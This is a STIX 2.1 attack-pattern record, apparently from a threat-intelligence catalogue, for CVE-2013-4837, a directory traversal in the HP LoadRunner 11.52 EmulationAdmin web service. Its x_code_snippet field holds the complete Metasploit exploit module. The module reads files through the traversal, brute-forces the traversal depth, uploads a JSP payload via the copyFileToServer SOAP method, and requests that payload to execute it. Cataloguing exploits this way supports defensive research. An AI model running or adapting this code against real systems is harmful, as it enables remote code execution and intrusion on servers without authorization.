{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa4a4253-e50a-4fce-934f-e2522cb82804",
    "created": "2024-08-14T16:51:49.857785Z",
    "modified": "2024-08-14T16:51:49.857789Z",
    "name": "HP LoadRunner EmulationAdmin Web Service Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in version 11.52 of HP LoadRunner. The vulnerability exists in the EmulationAdmin web service, specifically in the copyFileToServer method, allowing the upload of arbitrary files. This module has been tested successfully on HP LoadRunner 11.52 on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_loadrunner_copyfiletoserver.rb",
            "external_id": "hp_loadrunner_copyfiletoserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4837"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03969437"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote\\/1\\.1/ ] }\n\n  include REXML\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP LoadRunner EmulationAdmin Web Service Directory Traversal',\n      'Description' => %q{\n        This module exploits a directory traversal vulnerability in version 11.52 of HP\n        LoadRunner. The vulnerability exists in the EmulationAdmin web service, specifically\n        in the copyFileToServer method, allowing the upload of arbitrary files. This module has\n        been tested successfully on HP LoadRunner 11.52 on Windows 2003 SP2.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-4837' ],\n          [ 'OSVDB', '99231' ],\n          [ 'BID', '63475' ],\n          [ 'ZDI', '13-259' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03969437' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_JAVA,\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'Targets'     =>\n        [\n          [ 'HP LoadRunner 11.52', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-10-30'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        # By default files dropped into C:\\windows\\system32\\null\\\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 3 ]),\n        # By default HP LoadRunner installed on C:\\Program Files\\HP\\LoadRunner\n        OptString.new('INSTALLPATH', [ true, 'HP LoadRunner Install Path (from the root folder)', \"Program Files\\\\HP\\\\LoadRunner\" ])\n      ])\n  end\n\n  def get_soap_request(action, opts={})\n    path_param     = opts[:path]\n    contents_param = opts[:contents]\n\n    se_name = ''\n    case action\n    when :upload\n      se_name = 'ser:copyFileToServer'\n    when :read\n      se_name = 'ser:getFileContentAsLines'\n    end\n\n    xml = Document.new\n    xml.add_element(\n      \"soapenv:Envelope\",\n      {\n        'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n        'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n        'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n        'xmlns:ser'     => \"http://service.emulation.ws.mercury.com\"\n      })\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n    body = xml.root.elements[2]\n    body.add_element(\n      se_name,\n      {\n        'soapenv:encodingStyle' => \"http://schemas.xmlsoap.org/soap/encoding/\"\n      })\n    ser = body.elements[1]\n    ser.add_element(\"in0\", {'xsi:type' => 'xsd:int'})\n    ser.elements['in0'].text = 30000 + rand(30000)\n    ser.add_element(\"in1\", {'xsi:type' => 'xsd:string'})\n    ser.elements['in1'].text = path_param\n\n    if action == :upload\n      ser.add_element(\"in2\", {'xsi:type' => \"xsd:base64Binary\"})\n      ser.elements['in2'].text = Rex::Text.encode_base64(contents_param)\n    end\n\n    xml.to_s\n  end\n\n  def check\n    depth = datastore['DEPTH']\n    install_path = datastore['INSTALLPATH']\n\n    vprint_status(\"Detecting tomcat version...\")\n    tomcat_version = get_tomcat_version\n\n    if tomcat_version\n      print_status(\"Tomcat #{tomcat_version} detected... Verifying traversal...\")\n      location = \"\"\n      location << install_path\n      location << \"\\\\\" unless install_path.ends_with(\"\\\\\") or install_path.ends_with(\"/\")\n      location << \"apache-tomcat-#{tomcat_version}\\\\webapps\\\\ServiceEmulation\"\n\n      res = read_file(depth, location, \"index.jsp\")\n\n      if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/\n        vprint_good(\"Traversal exists and parameters are correct...\")\n        return Exploit::CheckCode::Vulnerable\n      elsif res and res.code == 500 and res.body.to_s =~ /FileNotFoundException/\n        vprint_warning(\"Traversal appears to exist, try adjusting parameters DEPTH and INSTALLPATH...\")\n        return Exploit::CheckCode::Appears\n      else\n        vprint_error(\"Failed to verify the directory traversal...\")\n      end\n    else\n      vprint_error(\"Tomcat version not detected...\")\n    end\n\n    vprint_status(\"Checking if the vulnerable web service and method exist...\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri('ServiceEmulation', 'services', 'EmulationAdmin'),\n      'vars_get' => { 'wsdl' => 1 }\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /wsdl.*EmulationAdmin/ and res.body.to_s =~ /copyFileToServerRequest/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    depth = datastore['DEPTH']\n    install_path = datastore['INSTALLPATH']\n\n    print_status(\"Retrieving the Tomcat version used...\")\n    tomcat_version = get_tomcat_version\n\n    if tomcat_version.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to retrieve the Tomcat version used\")\n    else\n      print_good(\"Tomcat #{tomcat_version} found\")\n    end\n\n    print_status(\"Verifying parameters to exploit the directory traversal...\")\n    brute_force = false\n    location = \"\"\n    location << install_path\n    location << \"\\\\\" unless install_path.ends_with(\"\\\\\") or install_path.ends_with(\"/\")\n    location << \"apache-tomcat-#{tomcat_version}\\\\webapps\\\\ServiceEmulation\"\n\n    res = read_file(depth, location, \"index.jsp\")\n\n    if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/\n      print_good(\"Traversal parameters are correct\")\n    elsif res and res.code == 500 and res.body.to_s =~ /FileNotFoundException/\n      print_error(\"Traversal parameters are incorrect, will try to brute force depth...\")\n      brute_force = true\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unknown error while verifying the traversal parameters\")\n    end\n\n    if brute_force\n      print_status(\"Trying to brute force the traversal depth...\")\n      depth = brute_force_depth(location)\n      if depth.nil?\n        fail_with(Failure::BadConfig, \"#{peer} - Traversal parameters are incorrect, try setting DEPTH and INSTALLPATH\")\n      end\n      print_good(\"Using #{depth} as depth length to exploit the traversal...\")\n    end\n\n    jsp_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n\n    # It's uploading a JSP payload because AutoDeploy on the webapps directory isn't working on my tests\n    print_status(\"Uploading the JSP payload...\")\n    res = upload_file(depth, location, jsp_name, payload.encoded)\n\n    if res and res.code == 200 and res.body.to_s =~ /copyFileToServerResponse/ and res.body.to_s !~ /faultcode/\n      print_good(\"JSP payload uploaded successfully\")\n      register_files_for_cleanup(\"..\\\\..\\\\#{location}\\\\#{jsp_name}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP payload upload failed\")\n    end\n\n    print_status(\"Executing payload on #{normalize_uri('ServiceEmulation', 'services', 'EmulationAdmin', jsp_name)}...\")\n\n    send_request_cgi({\n      'uri'    => normalize_uri('ServiceEmulation', jsp_name),\n      'method' => 'GET'\n    }, 1)\n  end\n\n  def send_request_soap(soap_request)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, 'ServiceEmulation', 'services', 'EmulationAdmin'),\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => soap_request,\n      'headers'  => {\n        'SOAPAction'    => '\"\"',\n      }\n    })\n\n    return res\n  end\n\n  def upload_file(traversal_depth, location, file_name, contents)\n    path = \"..\\\\\" * traversal_depth\n    path << location\n    path << \"\\\\\" unless location[-1] == \"/\" or location[-1] == \"\\\\\"\n    path << file_name\n\n    req = get_soap_request(:upload, {:path => path, :contents => contents})\n\n    return send_request_soap(req)\n  end\n\n  def read_file(traversal_depth, location, file_name)\n    path = \"..\\\\\" * traversal_depth\n    path << location\n    path << \"\\\\\" unless location[-1] == \"/\" or location[-1] == \"\\\\\"\n    path << file_name\n\n    req = get_soap_request(:read, {:path => path})\n\n    return send_request_soap(req)\n  end\n\n  def brute_force_depth(location)\n    10.times do |i|\n      res = read_file(i, location, \"index.jsp\")\n\n      if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/\n        return i\n      end\n    end\n\n    return nil\n  end\n\n  def get_tomcat_version\n    res = send_request_cgi({\n      'uri' => normalize_uri('webdav')\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /Apache Tomcat\\/([\\d\\.]+)/\n      return $1\n    end\n\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "win'"
    ]
}